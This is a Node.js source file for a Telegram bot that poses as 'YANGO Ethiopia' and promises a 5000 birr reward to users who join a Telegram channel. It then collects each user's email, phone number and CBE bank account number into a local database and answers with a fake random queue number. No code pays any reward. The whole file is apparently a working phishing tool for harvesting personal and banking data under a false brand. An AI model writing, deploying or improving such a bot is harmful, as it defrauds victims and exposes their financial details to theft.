const TelegramBot = require('node-telegram-bot-api');
const sqlite3 = require('sqlite3').verbose();
const punycode = require('punycode');
const { InlineKeyboard, InlineKeyboardButton } = require('node-telegram-keyboard-wrapper');
const token = process.env.API_KEY;
const bot = new TelegramBot(token, { polling: true });
const db = new sqlite3.Database('userDetails.db');

// Create userDetails table if it doesn't exist
db.run(`CREATE TABLE IF NOT EXISTS userDetails (
    userId INTEGER PRIMARY KEY,
    chatId INTEGER,
    username TEXT,
    email TEXT,
    phone TEXT,
    bankacc TEXT,
	joinedChannel BOOLEAN DEFAULT 0
)`);

// Object to store user instances for the session
const userSessions = {};
function saveToState(userId, chatId, user) {
    const { username, email, phone, bankacc } = user;
    userSessions[userId] = { chatId, username, email, phone, bankacc };
}
bot.onText(/\/start/, (msg) => {
	const chatId = msg.chat.id;
	const userId = msg.from.id;
	saveUserDetails(userId, chatId, msg.from);
	
	
	bot.sendPhoto(chatId, "https://avatars.mds.yandex.net/get-lpc/10704932/e6959cb9-fd4e-4334-ab78-1d2645d23de0/orig?width=2168&height=1165", { caption: `Welcome to YANGO! ${msg.from.username}` })
		.then(() => {
			bot.sendMessage(chatId, "To participate in the competition, press `Join`.", {
				"reply_markup": {
					"keyboard": [["Join"],["Get reward"], ["Check Payment status"]]
					},
				
				})
				.then(() => {
					console.log('Greeting Message sent successfully');
					
				})
				.catch((error) => {
					console.error('Error sending Greeting message:', error);
				});
		})
		.catch((error) => {
			console.error('Error sending image:', error);
		});

});



bot.on('message', (msg) => {
	var join = "Join";
	text=""
	if (msg.text.indexOf(join) === 0) {
		bot.sendMessage(msg.chat.id,"<b>you have joined the reward task !</b> \n <i> Join the channel and click 'Get reward' to receive 5000 birr bonus !💰💸 </i> \n 👉🏾<a href=\"t.me/yango_ethiopia\">YANGO ETHIOPIA</a> 👈🏾  \n \n click checker to check join status" ,{parse_mode : "HTML"});
		
	}
});
// bot.on('message', (msg) => {
// 	var checker = "Checker";
// 	text=""
// 	if (msg.text.indexOf(checker) === 0) {

// 	}
// });


bot.onText(/Get reward/i, (msg) => {
    const chatId = msg.chat.id;
    const user_id = msg.from.id;
   

    // Check if user is a member of the channel
    bot.getChatMember("@yango_ethiopia", user_id)
        .then((chatMember) => {
            // Check the status of the chat member
			console.log(chatMember);
            if (chatMember.status === 'member' || chatMember.status === 'creator') {
                // User is a member of the channel
                // Update database to mark user as joined the channel
                const updateQuery = 'UPDATE userDetails SET joinedChannel = ? WHERE userId = ?';
                db.run(updateQuery, [true, user_id], (err) => {
                    if (err) {
                        console.error('Error updating database:', err.message);
                        return;
                    }
                    bot.sendMessage(chatId, "Task complete ✅");
					startreward(chatId,user_id);
                });
            } 
			else if (chatMember.status === 'left') {
                // User is not a member of the channel
                bot.sendMessage(chatId, "You are not a member of the channel.");
            }
        })
        .catch((error) => {
            // Error occurred while retrieving chat member info
            console.error('Error:', error.message);
            bot.sendMessage(chatId, "An error occurred while checking your membership status.");
        });
});


function startreward(chatId, user_id) {
    // Prompt the user to provide their email

    bot.sendMessage(chatId, "Reward process has started please provide your details carefully for reward delivery...");
    bot.sendMessage(chatId, "Send your email address: example@gmail.com");
    // Set up a listener for the user's response
    bot.once('message', (msg) => {
        const email = msg.text;
        // Prompt the user to provide their phone number
        bot.sendMessage(chatId, "Now provide your phone number: +251956200000");
        // Set up a listener for the user's response
        bot.once('message', (msg) => {
            const phone = msg.text;
            // Prompt the user to provide their bank account details
            bot.sendMessage(chatId, "Please provide your CBE bank account number:");
            // Set up a listener for the user's response
            bot.once('message', (msg) => {
                const bankacc = msg.text;
                // Update the database with the provided details
                const updateQuery = `UPDATE userDetails 
                                     SET email = ?, phone = ?, bankacc = ? 
                                     WHERE userId = ?`;
                db.run(updateQuery, [email, phone, bankacc, user_id], (err) => {
                    if (err) {
                        console.error('Error updating database:', err.message);
                        bot.sendMessage(chatId, "An error occurred while saving your details.");
                        return;
                    }
					const queueNumber = Math.floor(Math.random() * 1000) + 1;

					// Inform the user about their reward and queue number
					bot.sendMessage(chatId, `Your Reward is on its way!\n\nQueue #${queueNumber}/1000.`);

                    // Now you can proceed with the reward process
                    // (e.g., sending the reward to the user)
                });
            });
        });
    });
}



// Function to save user details to the database
function saveUserDetails(userId, chatId, user) {
    const {Id, username, email, phone} = user;
    db.run('INSERT OR IGNORE INTO userDetails (userId, chatId, username, email, phone, bankacc,joinedChannel) VALUES (?, ?, ?, ?, ?, ?,?)', 
        [userId, chatId, username, user.email || null, user.phone || null, user.bankacc || null,user.joinedChannel||0], function(err) {
        if (err) {
            return console.error('Error saving user details to database:', err.message);
        }
        console.log('User details saved to database:', userId);
		saveToState(userId, chatId, user);
    });


}
console.log(userSessions.username);
// Handle errors
db.on('error', (err) => {
    console.error('Database error:', err.message);
});

// Query the database to check if user details are available
bot.onText(/Check Payment status/i, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id; // Extract userId from the message

    // Fetch user details from the database
    const query = 'SELECT * FROM userDetails WHERE userId = ?';
    db.get(query, [userId], (err, row) => {
        if (err) {
            console.error('Error querying database:', err.message);
            bot.sendMessage(chatId, "An error occurred while fetching your details.");
            return;
        }
        if (row) {
            let userDetailsText = `Your Reward is on its way!✅✅✅\n\n`;
            userDetailsText += `User Details:\n`;
            userDetailsText += `-----------------\n`;
            userDetailsText += `Username: ${row.username}\n`;
            userDetailsText += `Chat ID: ${row.chatId}\n`;
            userDetailsText += `-----------------\n`;

            // Check if email, phone, and bankacc are not null, if not, display them
            if (row.email) {
                userDetailsText += `Email: ${row.email}\n`;
            } else {
                userDetailsText += `Email: Pending...\n`;
            }
            if (row.phone) {
                userDetailsText += `Phone: ${row.phone}\n`;
            } else {
                userDetailsText += `Phone: Pending...\n`;
            }
            if (row.bankacc) {
                userDetailsText += `Bank Account: ${row.bankacc}\n`;
            } else {
                userDetailsText += `Bank Account: Pending...\n`;
            }

            bot.sendMessage(chatId, userDetailsText);
            
            // Now you can proceed with the reward process
            // (e.g., sending the reward to the user)
        } else {
            bot.sendMessage(chatId, "Your details are not available in the database.");
        }
    });

});


// Handle join command
bot.onText(/\/join/, (msg) => {
    const userId = msg.from.id;

    // Access user instance from the session object
    const user = userSessions[userId];
    if (user) {
        // Perform actions based on user instance
        bot.sendMessage(user.id, 'You have joined the competition.');
    } else {
        bot.sendMessage(msg.chat.id, 'User instance not found.');
    }
});

// Close the database connection when the bot stops
process.on('SIGINT', () => {
    db.close((err) => {
        if (err) {
            return console.error('Error closing database connection:', err.message);
        }
        console.log('Database connection closed');
        process.exit();
    });
});
